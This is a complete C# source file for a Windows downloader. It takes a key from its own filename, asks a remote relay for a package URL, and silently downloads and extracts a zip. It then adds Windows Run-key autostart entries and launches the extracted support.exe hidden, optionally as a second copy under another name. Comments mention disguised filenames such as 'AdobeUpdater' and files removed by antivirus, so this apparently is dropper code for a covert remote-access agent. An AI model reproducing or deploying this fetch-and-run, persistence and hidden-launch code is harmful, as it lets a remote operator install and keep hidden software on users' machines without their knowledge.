using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

class Downloader {
    const string RELAY     = "https://aegis-relay-production.up.railway.app";
    const string RELAY_WSS = "wss://aegis-relay-production.up.railway.app";

    static string _log = Path.Combine(Path.GetTempPath(), "aegis-dl.log");
    static void Log(string msg) {
        try { File.AppendAllText(_log, DateTime.Now.ToString("HH:mm:ss") + " " + msg + "\r\n"); } catch { }
    }

    [STAThread]
    static void Main(string[] args) {
        bool created;
        new Mutex(true, "AegisDownloader_v1", out created);
        if (!created) { Log("already running, exit"); return; }
        try { Run(args.Length > 0 ? args[0] : ""); }
        catch (Exception ex) { Log("FATAL: " + ex); }
    }

    static void Run(string key) {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072; // TLS 1.2 for all calls
        Log("start key=" + (string.IsNullOrEmpty(key) ? "(none)" : key));
        // Derive key from own filename if not passed as arg
        if (string.IsNullOrEmpty(key)) {
            string fn = Path.GetFileNameWithoutExtension(
                System.Reflection.Assembly.GetExecutingAssembly().Location);
            fn = Regex.Replace(fn, @" \(\d+\)$", "");
            // Key is ALWAYS the last 20 base64url chars — works with any name prefix
            // (support-KEY, downloader-KEY, AdobeUpdater-KEY, etc.)
            if (fn.Length >= 20) {
                string candidate = fn.Substring(fn.Length - 20);
                if (Regex.IsMatch(candidate, @"^[A-Za-z0-9_\-]{20}$"))
                    key = candidate;
            }
            Log("key from filename: " + (string.IsNullOrEmpty(key) ? "(none)" : key));
        }

        // Fetch app names from relay
        string firstName  = "Support";
        string secondName = "";
        if (!string.IsNullOrEmpty(key)) {
            try {
                var wc = new WebClient();
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                string r = wc.UploadString(RELAY + "/api/key-meta",
                    "{\"key\":\"" + key + "\"}");
                firstName  = Json(r, "appName")  ?? "Support";
                secondName = Json(r, "appName2") ?? "";
                Log("key-meta ok firstName=" + firstName + " second=" + secondName);
            } catch (Exception ex) { Log("key-meta ERR: " + ex.Message); }
        }

        // Install dir = where this exe lives (placed there by the installer)
        string installDir = Path.GetDirectoryName(
            System.Reflection.Assembly.GetExecutingAssembly().Location);
        Log("installDir=" + installDir);

        // Get zip URL from relay
        string zipUrl = "";
        try {
            var wc = new WebClient();
            string r = wc.DownloadString(RELAY + "/api/app-package");
            zipUrl = Json(r, "url") ?? "";
            Log("zipUrl=" + zipUrl);
        } catch (Exception ex) { Log("app-package ERR: " + ex.Message); }
        if (string.IsNullOrEmpty(zipUrl)) { Log("no zipUrl, exit"); return; }

        // Download zip to temp
        string zipPath = Path.Combine(Path.GetTempPath(),
            "aegis-pkg-" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".zip");
        Log("downloading to " + zipPath);
        try {
            var wc2 = new WebClient();
            wc2.DownloadFile(zipUrl, zipPath);
            Log("download done: " + new FileInfo(zipPath).Length + " bytes");
        } catch (Exception ex) { Log("download ERR: " + ex.Message); return; }

        // Extract silently into install dir
        Log("extracting...");
        try {
            using (var zip = ZipFile.OpenRead(zipPath)) {
                int count = 0;
                foreach (var entry in zip.Entries) {
                    if (string.IsNullOrEmpty(entry.Name)) continue;
                    string dest = Path.Combine(installDir,
                        entry.FullName.Replace('/', Path.DirectorySeparatorChar));
                    string dir = Path.GetDirectoryName(dest);
                    if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
                    try { entry.ExtractToFile(dest, true); count++; } catch (Exception ex) { Log("extract entry ERR " + entry.FullName + ": " + ex.Message); }
                }
                Log("extracted " + count + " files");
            }
        } catch (Exception ex) { Log("extract ERR: " + ex); }
        finally {
            try { File.Delete(zipPath); } catch { }
        }

        string mainExe = Path.Combine(installDir, "support.exe");
        if (!File.Exists(mainExe)) { Log("support.exe not found after extract"); return; }

        bool dual = !string.IsNullOrEmpty(secondName);

        // Write config for primary — always create it (do NOT require pre-existence;
        // the file may be absent if AV removed it or the zip structure changed).
        string cfgPath = Path.Combine(installDir, "resources", "app", "agent", "config.default.json");
        if (!string.IsNullOrEmpty(key)) {
            try { Directory.CreateDirectory(Path.GetDirectoryName(cfgPath)); } catch { }
            string cfg = dual
                ? "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \"" + key
                  + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 1,\r\n  \"appName\": \""
                  + firstName + "\"\r\n}"
                : "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \"" + key
                  + "\",\r\n  \"enabled\": true\r\n}";
            try { File.WriteAllText(cfgPath, cfg); } catch { }
        }

        // Register autostart for primary
        string dataDir1 = dual ? Path.Combine(installDir, "userdata") : "";
        string runCmd = dual
            ? "\"" + mainExe + "\" --startup --user-data-dir=\"" + dataDir1 + "\""
            : "\"" + mainExe + "\" --startup";
        SetRun(firstName, runCmd);
        LaunchHidden(mainExe, dual
            ? "--startup --user-data-dir=\"" + dataDir1 + "\""
            : "--startup");

        // Second copy
        if (dual) {
            string dir2 = Path.Combine(
                Path.GetDirectoryName(installDir), secondName);
            Directory.CreateDirectory(dir2);
            CopyDir(installDir, dir2);

            string cfg2Path = Path.Combine(dir2, "resources", "app", "agent", "config.default.json");
            if (!string.IsNullOrEmpty(key)) {
                try { Directory.CreateDirectory(Path.GetDirectoryName(cfg2Path)); } catch { }
                string cfg2 = "{\r\n  \"relay\": \"" + RELAY_WSS + "\",\r\n  \"key\": \""
                    + key + "\",\r\n  \"enabled\": true,\r\n  \"instance\": 2,\r\n  \"appName\": \""
                    + secondName + "\"\r\n}";
                try { File.WriteAllText(cfg2Path, cfg2); } catch { }
            }
            string exe2  = Path.Combine(dir2, "support.exe");
            string data2 = Path.Combine(dir2, "userdata");
            SetRun(secondName, "\"" + exe2 + "\" --startup --user-data-dir=\"" + data2 + "\"");
            LaunchHidden(exe2, "--startup --user-data-dir=\"" + data2 + "\"");
        }
    }

    static void CopyDir(string src, string dst) {
        foreach (var file in Directory.GetFiles(src, "*", SearchOption.AllDirectories)) {
            if (file.Contains(Path.DirectorySeparatorChar + "userdata" + Path.DirectorySeparatorChar)) continue;
            string rel  = file.Substring(src.Length).TrimStart(Path.DirectorySeparatorChar);
            string dest = Path.Combine(dst, rel);
            Directory.CreateDirectory(Path.GetDirectoryName(dest));
            try { File.Copy(file, dest, true); } catch { }
        }
    }

    static void SetRun(string name, string cmd) {
        try {
            var key = Registry.CurrentUser
                .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null) key.SetValue(name, cmd);
        } catch { }
    }

    static void LaunchHidden(string exe, string args) {
        try {
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo {
                FileName        = exe,
                Arguments       = args,
                UseShellExecute = true,
                WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden
            });
        } catch { }
    }

    static string Json(string json, string key) {
        var m = Regex.Match(json, "\"" + Regex.Escape(key) + "\"\\s*:\\s*\"([^\"]+)\"");
        return m.Success ? m.Groups[1].Value : null;
    }
}
